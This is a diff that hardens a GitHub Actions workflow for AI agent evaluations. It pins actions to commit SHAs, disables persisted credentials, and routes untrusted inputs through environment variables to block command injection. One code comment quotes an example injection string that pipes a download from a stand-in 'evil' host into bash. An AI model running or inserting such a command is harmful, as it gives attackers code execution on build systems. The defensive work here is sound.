@@ -31,9 +31,11 @@ jobs:
       AGENT_EVAL_RUNS_DIR: eval/runs
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4
+        with:
+          persist-credentials: false
 
-      - uses: actions/setup-python@v5
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5
         with:
           python-version: '3.12'
 
@@ -52,20 +54,27 @@ jobs:
           for i in $(seq 1 30); do
             if curl -sf http://localhost:8080/rest/api/2/priority > /dev/null 2>&1; then
               echo "jira-emulator ready"
-              break
+              exit 0
             fi
             sleep 2
           done
+          echo "jira-emulator did not become ready" >&2
+          exit 1
 
       - name: Seed jira-emulator
         run: bash eval/fixtures/seed-jira-emulator.sh
 
       - name: Determine run ID
         id: run-id
+        env:
+          # Workflow inputs are untrusted — route through env, not direct ${{ }} interpolation,
+          # so strings like '; curl evil | bash; ' can't break out of the run: block (CWE-94).
+          MODEL_INPUT: ${{ inputs.model || 'claude-opus-4-6' }}
+          RUN_ID_INPUT: ${{ inputs.run-id }}
         run: |
-          MODEL="${{ inputs.model || 'claude-opus-4-6' }}"
+          MODEL="$MODEL_INPUT"
           SHORT_MODEL=$(echo "$MODEL" | sed 's/claude-//' | sed 's/-[0-9]*$//')
-          RUN_ID="${{ inputs.run-id }}"
+          RUN_ID="$RUN_ID_INPUT"
           if [ -z "$RUN_ID" ]; then
             RUN_ID="$(date -u +%Y-%m-%d)-${SHORT_MODEL}-ci"
           fi
@@ -73,14 +82,17 @@ jobs:
           echo "model=$MODEL" >> "$GITHUB_OUTPUT"
 
       - name: Run evaluation
+        env:
+          RUN_MODEL: ${{ steps.run-id.outputs.model }}
+          RUN_ID: ${{ steps.run-id.outputs.id }}
         run: |
           claude -p \
-            --model ${{ steps.run-id.outputs.model }} \
-            "/eval-run --config eval-rfe-create.yaml --model ${{ steps.run-id.outputs.model }} --run-id ${{ steps.run-id.outputs.id }}"
+            --model "$RUN_MODEL" \
+            "/eval-run --config eval-rfe-create.yaml --model $RUN_MODEL --run-id $RUN_ID"
 
       - name: Upload eval results
         if: always()
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02  # v4
         with:
           name: eval-dedup-${{ steps.run-id.outputs.id }}
           path: eval/runs/${{ steps.run-id.outputs.id }}/
